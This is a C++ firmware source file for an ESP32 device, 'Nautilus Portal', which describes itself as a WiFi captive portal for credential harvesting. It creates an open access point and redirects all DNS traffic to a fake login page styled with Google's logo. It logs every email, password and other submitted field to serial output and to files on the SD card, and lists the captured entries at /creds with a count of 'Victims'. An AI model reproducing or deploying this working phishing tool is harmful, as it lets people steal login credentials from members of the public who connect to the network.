// Nautilus Portal - WiFi Captive Portal for credential harvesting
// Based on NEMO Portal implementation

#include <Arduino.h>
#include "portal.h"
#include "utilities.h"
#include "peripheral/peripheral.h"

// Portal state variables
int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = 0;
String capturedCredentialsHtml = "";
bool portal_is_running = false;
String portalSsidName = DEFAULT_PORTAL_SSID;

// Network settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress AP_GATEWAY(172, 0, 0, 1);
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

// Helper function to load file contents into string
inline bool loadFileToString(File& file, String& output) {
    output = "";
    while (file.available()) {
        output += (char)file.read();
    }
    file.close();
    return true;
}

/**
 * Set portal SSID name
 */
void setPortalSSID(String ssid) {
    portalSsidName = ssid;
    Serial.printf("[Portal] SSID set to: %s\n", ssid.c_str());
}

/**
 * Setup WiFi in AP mode for portal
 */
void setupPortalWiFi() {
    Serial.println("[Portal] Initializing WiFi AP");

    // Load portal SSID from config if available
    extern NautilusConfig g_config;
    if (strlen(g_config.wifi.portal.ssid) > 0) {
        portalSsidName = String(g_config.wifi.portal.ssid);
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
    WiFi.softAP(portalSsidName.c_str());

    Serial.printf("[Portal] AP started: %s\n", portalSsidName.c_str());
    Serial.printf("[Portal] IP: %s\n", AP_GATEWAY.toString().c_str());
}

/**
 * Append credentials to file on SD card
 */
void appendToPortalFile(const char* path, const char* message) {
    if (!sd_is_valid()) {
        Serial.println("[Portal] SD card not available");
        return;
    }

    File file = SD.open(path, FILE_APPEND);
    if (!file) {
        Serial.printf("[Portal] Failed to open file: %s\n", path);
        return;
    }

    if (file.print(message)) {
        Serial.printf("[Portal] Wrote to %s: %s\n", path, message);
    } else {
        Serial.println("[Portal] Write failed");
    }

    file.close();
}

/**
 * Load custom HTML from /portal/index.html if it exists
 */
bool loadCustomHtml(String& html) {
    if (!sd_is_valid()) {
        return false;
    }

    File file = SD.open(PORTAL_HTML_PATH, FILE_READ);
    if (!file) {
        Serial.println("[Portal] No custom index.html found, using default");
        return false;
    }

    loadFileToString(file, html);

    Serial.printf("[Portal] Loaded custom HTML (%d bytes)\n", html.length());
    return true;
}

/**
 * Load custom POST response HTML from /portal/post.html if it exists
 */
bool loadCustomPostHtml(String& html) {
    if (!sd_is_valid()) {
        return false;
    }

    File file = SD.open(PORTAL_POST_HTML_PATH, FILE_READ);
    if (!file) {
        Serial.println("[Portal] No custom post.html found, using default");
        return false;
    }

    loadFileToString(file, html);

    Serial.printf("[Portal] Loaded custom POST HTML (%d bytes)\n", html.length());
    return true;
}

/**
 * Sanitize input by escaping HTML characters
 */
String getInputValue(String argName) {
    String a = webServer.arg(argName);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    a.substring(0, 200);
    return a;
}

/**
 * Build HTML page with standard Google-style wrapper
 */
String getHtmlContents(String body) {
    String html =
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "  <title>" + portalSsidName + "</title>"
        "  <meta charset='UTF-8'>"
        "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
        "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
        "</head>"
        "<body>"
        "  <div class='container'>"
        "    <div class='logo-container'>"
        "      <?xml version='1.0' standalone='no'?>"
        "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
        "    </div>"
        "    <div class=form-container>"
        "      <center>"
        "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>"
        "      </center>"
        "      <div style='min-height: 150px'>"
        + body + "      </div>"
        "    </div>"
        "  </div>"
        "</body>"
        "</html>";
    return html;
}

/**
 * GET /creds - Show captured credentials
 */
String creds_GET() {
    return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

/**
 * GET / - Main login page
 */
String index_GET() {
    // Try to load custom HTML first
    String customHtml;
    if (loadCustomHtml(customHtml)) {
        return customHtml;
    }

    // Fall back to default login page
    String loginTitle = String(LOGIN_TITLE);
    String loginSubTitle = String(LOGIN_SUBTITLE);
    String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
    String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
    String loginMessage = String(LOGIN_MESSAGE);
    String loginButton = String(LOGIN_BUTTON);

    return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}

/**
 * POST /post - Handle form submission (flexible for any form fields)
 */
String index_POST() {
    // Build JSON object with all posted parameters
    String jsonLine = "{";
    String htmlDisplay = "<li>";
    bool firstParam = true;

    // Iterate through all POST parameters
    int numParams = webServer.args();
    for (int i = 0; i < numParams; i++) {
        String paramName = webServer.argName(i);
        String paramValue = getInputValue(paramName);

        // Build JSON (escape quotes in values)
        String escapedValue = paramValue;
        escapedValue.replace("\\", "\\\\");  // Escape backslashes first
        escapedValue.replace("\"", "\\\"");  // Escape quotes

        if (!firstParam) {
            jsonLine += ",";
            htmlDisplay += ", ";
        }
        jsonLine += "\"" + paramName + "\":\"" + escapedValue + "\"";
        htmlDisplay += paramName + ": <b>" + paramValue + "</b>";
        firstParam = false;

        Serial.printf("[Portal] %s: %s\n", paramName.c_str(), paramValue.c_str());
    }
    jsonLine += "}\n";
    htmlDisplay += "</li>";

    totalCapturedCredentials++;
    capturedCredentialsHtml = htmlDisplay + capturedCredentialsHtml;

    // Beep to indicate new credential captured
    // 1000Hz tone for 100ms on LEDC channel 0
    ledcSetup(0, 1000, 8);      // channel, freq, resolution
    ledcAttachPin(7, 0);         // pin 7 (BOARD_VOICE_DIN), channel 0
    ledcWrite(0, 128);           // 50% duty cycle
    delay(100);
    ledcWrite(0, 0);             // Stop tone
    ledcDetachPin(7);            // Detach pin

    // Save to SD card
    if (sd_is_valid()) {
        // Create /portal directory if it doesn't exist
        if (!SD.exists("/portal")) {
            SD.mkdir("/portal");
        }

        // Save as JSON (one object per line - JSONL format)
        appendToPortalFile(PORTAL_JSON_PATH, jsonLine.c_str());

        // Also save to legacy creds.txt if email/password fields exist
        if (webServer.hasArg("email") && webServer.hasArg("password")) {
            String email = getInputValue("email");
            String password = getInputValue("password");
            String cred_line = String(email + " = " + password + "\n");
            appendToPortalFile(PORTAL_CREDS_PATH, cred_line.c_str());
        }
    }

    Serial.printf("[Portal] Captured %d form fields\n", numParams);

    // Try to load custom post.html, otherwise use default message
    String customPostHtml;
    if (loadCustomPostHtml(customPostHtml)) {
        return customPostHtml;
    }

    return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

/**
 * GET /ssid - Show SSID change form
 */
String ssid_GET() {
    return getHtmlContents("<p>Set a new SSID for Nautilus Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='" + portalSsidName + "' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}

/**
 * POST /postssid - Change portal SSID
 */
String ssid_POST() {
    String ssid = getInputValue("ssid");
    Serial.printf("[Portal] SSID changing to: %s\n", ssid.c_str());

    // Save to config
    extern NautilusConfig g_config;
    strncpy(g_config.wifi.portal.ssid, ssid.c_str(), sizeof(g_config.wifi.portal.ssid) - 1);
    g_config.wifi.portal.ssid[sizeof(g_config.wifi.portal.ssid) - 1] = '\0';

    config_save();

    setPortalSSID(ssid);
    printPortalHomeToScreen();

    return getHtmlContents("Nautilus Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
}

/**
 * GET /clear - Clear captured credentials
 */
String clear_GET() {
    capturedCredentialsHtml = "<p></p>";
    totalCapturedCredentials = 0;
    return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to credentials</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

/**
 * Setup web server routes
 */
void setupWebServer() {
    Serial.println("[Portal] Starting DNS server");
    dnsServer.start(DNS_PORT, "*", AP_GATEWAY);

    Serial.println("[Portal] Setting up web server routes");

    webServer.on("/post", []() {
        webServer.send(HTTP_CODE, "text/html", index_POST());
        printPortalHomeToScreen();
    });

    webServer.on("/creds", []() {
        webServer.send(HTTP_CODE, "text/html", creds_GET());
    });

    webServer.on("/clear", []() {
        webServer.send(HTTP_CODE, "text/html", clear_GET());
    });

    webServer.on("/ssid", []() {
        webServer.send(HTTP_CODE, "text/html", ssid_GET());
    });

    webServer.on("/postssid", []() {
        webServer.send(HTTP_CODE, "text/html", ssid_POST());
        delay(1000);
        shutdownWebServer();
        setupPortalWiFi();
        setupWebServer();
    });

    webServer.onNotFound([]() {
        lastActivity = millis();
        webServer.send(HTTP_CODE, "text/html", index_GET());
    });

    Serial.println("[Portal] Starting web server");
    webServer.begin();
}

/**
 * Shutdown portal web server
 */
void shutdownWebServer() {
    Serial.println("[Portal] Stopping DNS server");
    dnsServer.stop();

    Serial.println("[Portal] Closing web server");
    webServer.close();
    webServer.stop();

    Serial.println("[Portal] Setting WiFi to STA mode");
    WiFi.mode(WIFI_MODE_STA);
}

/**
 * Print portal status to screen (weak function - can be overridden in ui.cpp)
 */
__attribute__((weak)) void printPortalHomeToScreen() {
    Serial.printf("[Portal] SSID: %s\n", portalSsidName.c_str());
    Serial.printf("[Portal] IP: %s\n", AP_GATEWAY.toString().c_str());
    Serial.printf("[Portal] Victims: %d\n", totalCapturedCredentials);
}

/**
 * Start the portal
 */
void portal_start() {
    if (portal_is_running) {
        Serial.println("[Portal] Already running");
        return;
    }

    Serial.println("[Portal] Starting...");

    setupPortalWiFi();
    setupWebServer();

    portal_is_running = true;
    bootTime = millis();

    printPortalHomeToScreen();

    Serial.println("[Portal] Started successfully");
}

/**
 * Stop the portal
 */
void portal_stop() {
    if (!portal_is_running) {
        Serial.println("[Portal] Not running");
        return;
    }

    Serial.println("[Portal] Stopping...");

    shutdownWebServer();

    portal_is_running = false;

    Serial.println("[Portal] Stopped");
}

/**
 * Portal main loop - call this in main loop when portal is running
 */
void portal_loop() {
    if (!portal_is_running) {
        return;
    }

    dnsServer.processNextRequest();
    webServer.handleClient();
}
